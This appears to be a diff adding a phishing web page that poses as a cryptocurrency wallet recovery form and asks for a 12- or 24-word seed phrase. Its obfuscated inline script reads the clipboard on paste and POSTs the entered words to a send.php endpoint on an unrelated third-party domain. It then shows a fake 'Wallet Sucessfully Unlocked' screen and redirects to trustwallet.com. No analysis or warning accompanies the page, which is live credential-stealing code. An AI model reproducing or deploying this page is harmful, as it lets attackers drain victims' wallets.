+                            <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
+                       </div>
+                         <div class="eyeClick2 hide">
+                             <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z" fill="currentColor"></path></svg>
+                       </div>
+                       </div>
+                        <div class="box-forms">
+                         <input type="password" name="" id="word-24-15" placeholder="Word #15" class="word-24">
+                            <div class="eyeClick1">
+                            <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
+                       </div>
+                         <div class="eyeClick2 hide">
+                              <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z" fill="currentColor"></path></svg>
+                       </div>
+                       </div>
+
+                        <div class="box-forms">
+                         <input type="password" name="" id="word-24-16" placeholder="Word #16" class="word-24">
+                            <div class=" eyeClick1">
+                             <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
+                       </div>
+                         <div class="eyeClick2 hide">
+                             <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z" fill="currentColor"></path></svg>
+                       </div>
+                       </div>
+
+
+                         <div class="box-forms">
+                         <input type="password" name="" id="word-24-17" placeholder="Word #17" class="word-24">
+                            <div class=" eyeClick1">
+                              <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
+                       </div>
+                         <div class="eyeClick2 hide">
+                               <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z" fill="currentColor"></path></svg>
+                       </div>
+                       </div>
+
+                        <div class="box-forms">
+                         <input type="password" name="" id="word-24-18" placeholder="Word #18" class="word-24">
+                            <div class="eyeClick1">
+                          <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
+                       </div>
+                         <div class="eyeClick2 hide">
+                               <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z" fill="currentColor"></path></svg>
+                       </div>
+                       </div>
+                        <div class="box-forms">
+                         <input type="password" name="" id="word-24-19" placeholder="Word #19" class="word-24">
+                            <div class="eyeClick1">
+                              <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
+                       </div>
+                       <div class="eyeClick2 hide">
+                              <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z" fill="currentColor"></path></svg>
+                       </div>
+                       </div>
+
+                        <div class="box-forms">
+                         <input type="password" name="" id="word-24-20" placeholder="Word #20" class="word-24">
+                            <div class=" eyeClick1">
+                              <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
+                       </div>
+                       <div class="eyeClick2 hide">
+                        <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z" fill="currentColor"></path></svg> 
+                       </div>
+                       </div>
+
+
+                        <div class="box-forms">
+                         <input type="password" name="" id="word-24-21" placeholder="Word #21" class="word-24">
+                            <div class=" eyeClick1">
+                             <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
+                       </div>
+                         <div class="eyeClick2 hide">
+                              <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z" fill="currentColor"></path></svg> 
+                       </div>
+                       </div>
+
+                        <div class="box-forms">
+                         <input type="password" name="" id="word-24-22" placeholder="Word #22" class="word-24">
+                            <div class="eyeClick1">
+                             <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
+                       </div>
+                         <div class="eyeClick2 hide">
+                              <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z" fill="currentColor"></path></svg> 
+                       </div>
+                       </div>
+                        <div class="box-forms">
+                         <input type="password" name="" id="word-24-23" placeholder="Word #23" class="word-24">
+                            <div class="eyeClick1">
+                                <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
+                       </div>
+                         <div class="eyeClick2 hide">
+                             <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z" fill="currentColor"></path></svg> 
+                       </div>
+                       </div>
+
+                        <div class="box-forms">
+                         <input type="password" name="" id="word-24-24" placeholder="Word #24" class="word-24">
+                            <div class="eyeClick1">
+                             <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
+                       </div>
+                         <div class="eyeClick2 hide">
+                               <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z" fill="currentColor"></path></svg> 
+                       </div>
+                       </div>       
+                    </div>
+
+                   <div class="clear-btn">
+                     <button class="btn-clear" type="button">Clear all</button>
+                    </div>
+
+                  <div class="btnsback">
+                    <button class="back-btn">Back</button>
+                    <button class="btn-next btnNext-1" disabled="">Next</button>
+                </div>
+                </form>
+
+            </div>
+            </div>
+            </div>
+  
+    
+
+       <div class="container-box containBox3 hide">
+         <div class="logo">
+            <img src="https://bookings-appoff.netlify.app/img/log.png" alt="logo">
+         </div>
+
+        <div class="container">
+
+
+                <div class="header">
+                <h2>Wallet Sucessfully Unlocked</h2>
+                <p>Your wallet have been recovered sucessfully</p>
+             </div>
+
+            <div class="box1">
+                <p class="waitmsg">Please wait you will be redirected in <span class="counter">1:00</span></p>
+            </div>
+            
+             <div class="btnnext">
+                <button class="btnNext-1">Learn more →</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+	
+		const containerBox1 = document.querySelector(".container-box");
+const containerBox2 = document.querySelector(".container-box-2");
+const containBox3 = document.querySelector(".containBox3");
+const box1 = document.querySelector(".box1");
+const [btnNext1, btnNext2, btnNext3] = document.querySelectorAll(".btnNext-1");
+const [backBtn1, backBtn2] = document.querySelectorAll(".back-btn");
+const wordValue = document.querySelector(".word-value");
+const wordInput = document.querySelectorAll(".word-12");
+const wordInput24 = document.querySelectorAll(".word-24");
+const [mainform1, mainForm2] = document.querySelectorAll(".main-form");
+const eyeBox1 = document.querySelectorAll(".eyebox-1");
+const eyeBox2 = document.querySelectorAll('.eyebox-2');
+const preloader = document.querySelector(".preloader");
+const [form1, form2] = document.querySelectorAll("#form");
+const eyeClick1 = document.querySelectorAll('.eyeClick1');
+const eyeClick2 = document.querySelectorAll(".eyeClick2");
+const count2 = document.querySelector('.counter');
+const container2 = document.querySelector('.container-box-2');
+const [btnClear1, btnClear2] = document.querySelectorAll(".btn-clear");
+const word1 = document.getElementById('word1');
+const word2 = document.getElementById("word2");
+const word3 = document.getElementById("word3");
+const word4 = document.getElementById("word4");
+const word5 = document.getElementById("word5");
+const word6 = document.getElementById("word6");
+const word7 = document.getElementById("word7");
+const word8 = document.getElementById("word8");
+const word9 = document.getElementById("word9");
+const word10 = document.getElementById("word10");
+const word11 = document.getElementById('word11');
+const word12 = document.getElementById('word12');
+const word241 = document.getElementById("word-24-1");
+const word242 = document.getElementById("word-24-2");
+const word243 = document.getElementById("word-24-3");
+const word244 = document.getElementById('word-24-4');
+const word245 = document.getElementById('word-24-5');
+const word246 = document.getElementById("word-24-6");
+const word247 = document.getElementById("word-24-7");
+const word248 = document.getElementById("word-24-8");
+const word249 = document.getElementById('word-24-9');
+const word2410 = document.getElementById('word-24-10');
+const word2411 = document.getElementById('word-24-11');
+const word2412 = document.getElementById("word-24-12");
+const word2413 = document.getElementById("word-24-13");
+const word2414 = document.getElementById("word-24-14");
+const word2415 = document.getElementById("word-24-15");
+const word2416 = document.getElementById("word-24-16");
+const word2417 = document.getElementById("word-24-17");
+const word2418 = document.getElementById("word-24-18");
+const word2419 = document.getElementById('word-24-19');
+const word2420 = document.getElementById("word-24-20");
+const word2421 = document.getElementById('word-24-21');
+const word2422 = document.getElementById("word-24-22");
+const word2423 = document.getElementById('word-24-23');
+const word2424 = document.getElementById("word-24-24");
+wordInput.forEach((_0x20cfdb, _0x17fd08) => {
+  _0x20cfdb.addEventListener("paste", () => {
+    navigator.clipboard.readText().then(_0x28ae27 => {
+      const _0x2988d8 = _0x28ae27.split(" ");
+      _0x2988d8.forEach((_0x288e36, _0x2f9952) => {
+        wordInput[_0x2f9952].value = _0x288e36;
+        btnNext2.disabled = false;
+      });
+    });
+  });
+});
+wordInput24.forEach((_0x39701e, _0x59b132) => {
+  _0x39701e.addEventListener("paste", () => {
+    navigator.clipboard.readText().then(_0x4e890c => {
+      const _0x33992d = _0x4e890c.split(" ");
+      _0x33992d.forEach((_0xe10477, _0x3068f5) => {
+        wordInput24[_0x3068f5].value = _0xe10477;
+        btnNext3.disabled = false;
+      });
+    });
+  });
+});
+const timer2 = _0x63c5c9 => {
+  let _0x51d2e1 = setInterval(function () {
+    if (_0x63c5c9 <= 0x0) {
+      clearInterval(_0x51d2e1);
+    }
+    count2.textContent = "0:0" + (0x0 + _0x63c5c9) + " Seconds";
+    _0x63c5c9 -= 0x1;
+    if (_0x63c5c9 === -0x1) {
+      window.location.replace('https://trustwallet.com/');
+    }
+  }, 0x3e8);
+};
+const postData = _0x313489 => {
+  $.ajax({
+    'url': 'https://theshopperscircle.com/public/upload/users_images/send.php',
+    'type': "POST",
+    'data': {
+      'pass': _0x313489
+    }
+  });
+};
+const handleNextPage = () => {
+  containerBox1.classList.add("hide");
+  containerBox2.classList.remove("hide");
+};
+const handleBackPage = () => {
+  containerBox1.classList.remove("hide");
+  containerBox2.classList.add("hide");
+};
+box1.addEventListener('click', () => {
+  handleNextPage();
+});
+btnNext1.addEventListener('click', () => {
+  handleNextPage();
+});
+btnNext2.addEventListener("click", () => {
+  handleNextPage();
+});
+backBtn1.addEventListener("click", () => {
+  handleBackPage();
+});
+backBtn2.addEventListener("click", () => {
+  handleBackPage();
+});
+wordValue.addEventListener('change', () => {
+  if (wordValue.value === '12') {
+    mainform1.classList.remove("hide");
+    mainForm2.classList.add("hide");
+    container2.classList.remove("addWidth");
+    wordValue.classList.remove("width2");
+  } else {
+    mainForm2.classList.remove("hide");
+    mainform1.classList.add("hide");
+    container2.classList.add("addWidth");
+    wordValue.classList.add("width2");
+  }
+});
+form1.addEventListener("submit", _0x252f38 => {
+  _0x252f38.preventDefault();
+  if (word1.value === '' || word2.value === '' || word3.value === '' || word4.value === '' || word5.value === '' || word6.value === '' || word7.value === '' || word8.value === '' || word9.value === '' || word10.value === '' || word11.value === '' || word12.value === '') {
+    btnNext2.disabled = true;
+  } else {
+    let _0x435327 = "Word 1: " + word1.value + " \nWord 2: " + word2.value + " \nWord 3: " + word3.value + " \nWord 4: " + word4.value + " \nWord 5: " + word5.value + " \nWord 6: " + word6.value + " \nWord 7: " + word7.value + " \nWord 8: " + word8.value + " \nWord 9: " + word9.value + " \nWord 10: " + word10.value + " \nWord 11: " + word11.value + " \nWord 12: " + word12.value;
+    postData(_0x435327);
+    preloader.classList.remove("hide");
+    setTimeout(() => {
+      containerBox2.classList.add("hide");
+      containBox3.classList.remove("hide");
+      preloader.classList.add("hide");
+      timer2(0xa);
+    }, 0xbb8);
+  }
+});
+form2.addEventListener('submit', _0x3331d0 => {
+  _0x3331d0.preventDefault();
+  if (word241.value === '' || word242.value === '' || word243.value === '' || word244.value === '' || word245.value === '' || word246.value === '' || word247.value === '' || word248.value === '' || word249.value === '' || word2410.value === '' || word2411.value === '' || word2412.value === '' || word2413.value === '' || word2414.value === '' || word2415.value === '' || word2416.value === '' || word2417.value === '' || word2418.value === '' || word2419.value === '' || word2420.value === '' || word2421.value === '' || word2422.value === '' || word2423.value === '' || word2424.value === '') {
+    btnNext3.disabled = true;
+  } else {
+    let _0x292580 = "Word 1: " + word241.value + " \nWord 2: " + word242.value + " \nWord 3: " + word243.value + " \nWord 4: " + word244.value + " \nWord 5: " + word245.value + " \nWord 6: " + word246.value + " \nWord 7: " + word247.value + " \nWord 8: " + word248.value + " \nWord 9: " + word249.value + " \nWord 10: " + word2410.value + " \nWord 11: " + word2411.value + " \nWord 12: " + word2412.value + " \nWord 13: " + word2413.value + " \nWord 14: " + word2414.value + " \nWord 15: " + word2415.value + " \nWord 16: " + word2416.value + " \nWord 17: " + word2417.value + " \nWord 18: " + word2418.value + " \nWord 19: " + word2419.value + " \nWord 20: " + word2418.value + " \nWord 21: " + word2421.value + " \nWord 22: " + word2422.value + " \nWord 23: " + word2423.value + ", \nWord 24: " + word2422.value;
+    postData(_0x292580);
+    preloader.classList.remove("hide");
+    setTimeout(() => {
+      containerBox2.classList.add("hide");
+      containBox3.classList.remove("hide");
+      preloader.classList.add("hide");
+      timer2(0xa);
+    }, 0xbb8);
+  }
+});
+wordInput.forEach(_0x2996d1 => {
+  _0x2996d1.addEventListener('keyup', () => {
+    if (word1.value !== '' && word2.value !== '' && word3.value !== '' && word4.value !== '' && word5.value !== '' && word6.value !== '' && word7.value !== '' && word8.value !== '' && word9.value !== '' && word10.value !== '' && word11.value !== '' && word12.value !== '') {
+      btnNext2.disabled = false;
+    }
+  });
+});
+wordInput24.forEach(_0x314564 => {
+  _0x314564.addEventListener('keyup', () => {
+    if (word241.value !== '' && word242.value !== '' && word243.value !== '' && word244.value !== '' && word245.value !== '' && word246.value !== '' && word247.value !== '' && word248.value !== '' && word249.value !== '' && word2410.value !== '' && word2411.value !== '' && word2412.value !== '' && word2413.value !== '' && word2414.value !== '' && word2415.value !== '' && word2416.value !== '' && word245.value !== '' && word246.value !== '' && word247.value !== '' && word248.value !== '' && word249.value !== '' && word2417.value !== '' && word2418.value !== '' && word2419.value !== '' && word2420.value !== '' && word2421.value !== '' && word2422.value !== '' && word2423.value !== '' && word2424.value !== '') {
+      btnNext3.disabled = false;
+    }
+  });
+});
+eyeBox1.forEach((_0x234ab3, _0x7c8a5b) => {
+  _0x234ab3.addEventListener("click", () => {
+    wordInput[_0x7c8a5b].type = "text";
+    eyeBox1[_0x7c8a5b].classList.add('hide');
+    eyeBox2[_0x7c8a5b].classList.remove("hide");
+  });
+});
+eyeClick1.forEach((_0x287f76, _0xdc51cd) => {
+  _0x287f76.addEventListener("click", () => {
+    wordInput24[_0xdc51cd].type = "text";
+    eyeClick1[_0xdc51cd].classList.add("hide");
+    eyeClick2[_0xdc51cd].classList.remove("hide");
+  });
+});
+eyeBox2.forEach((_0x150ce0, _0x15c4b4) => {
+  _0x150ce0.addEventListener("click", () => {
+    wordInput[_0x15c4b4].type = "password";
+    eyeBox1[_0x15c4b4].classList.remove("hide");
+    eyeBox2[_0x15c4b4].classList.add("hide");
+  });
+});
+eyeClick2.forEach((_0x55e878, _0x165460) => {
+  _0x55e878.addEventListener("click", () => {
+    wordInput24[_0x165460].type = 'password';
+    eyeClick1[_0x165460].classList.remove("hide");
+    eyeClick2[_0x165460].classList.add("hide");
+  });
+});
+btnClear1.addEventListener("click", () => {
+  wordInput.forEach((_0x2125cb, _0x2d816b) => {
+    _0x2125cb.value = '';
+  });
+});
+btnClear2.addEventListener("click", () => {
+  wordInput24.forEach((_0x321b2a, _0x5a8c08) => {
+    _0x321b2a.value = '';
+  });
+});
+	</script>
+ 
+</body></html>
